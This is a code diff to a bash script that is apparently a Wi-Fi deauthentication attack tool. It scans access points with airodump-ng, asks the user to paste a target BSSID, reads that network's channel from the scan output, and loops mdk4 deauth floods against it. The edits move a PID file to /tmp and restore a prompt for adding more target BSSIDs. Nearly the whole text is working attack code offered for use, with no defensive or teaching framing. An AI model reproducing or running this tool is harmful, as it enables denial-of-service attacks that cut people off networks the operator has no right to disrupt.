@@ -10,7 +10,7 @@ airmon-ng stop wlan0 > /dev/null 2>&1
 airmon-ng stop wlan1 > /dev/null 2>&1
 airmon-ng stop wlan2 > /dev/null 2>&1
 airmon-ng stop wlan3 > /dev/null 2>&1
-echo $$ > zart_pid.txt
+echo $$ > /tmp/zart_pid.txt
 mdk="mdk4"
 
 xterm -hold -e "iwconfig" &
@@ -22,8 +22,8 @@ xterm -hold -e "airodump-ng -w scan --output-format csv -M $airodump_interface" 
 read -rp "copy paste bssid you want to deauth: " bssid_target
 echo "$bssid_target" > bl.txt
 mdk_channel=$(grep "$bssid_target" -m1 scan-01.csv | cut -d "," -f 4 | tr -d ' ')
-#echo "if you want to target more bssid copy paste them here"
-#xterm -e "nano bl.txt"
+echo "if you want to target more bssid copy paste them here"
+xterm -e "nano bl.txt"
 #read -rp "choose channel for mdk deauth: " mdk_channel
 #echo "$mdk_channel" > mdk_chan.txt
 #echo "if you want you can enter more channels here seperated with comma"
@@ -51,4 +51,4 @@ while true; do
 		xterm -e "$mdk $mdk_interface d -b bl.txt -c $mdk_channel" &
 	fi
 done
-#zart_pid=$(<zart_pid.txt) && kill -SIGTERM -- -$zart_pid
+#zart_pid=$( < ./tmp/zart_pid.txt) && kill -SIGTERM -- -$zart_pid
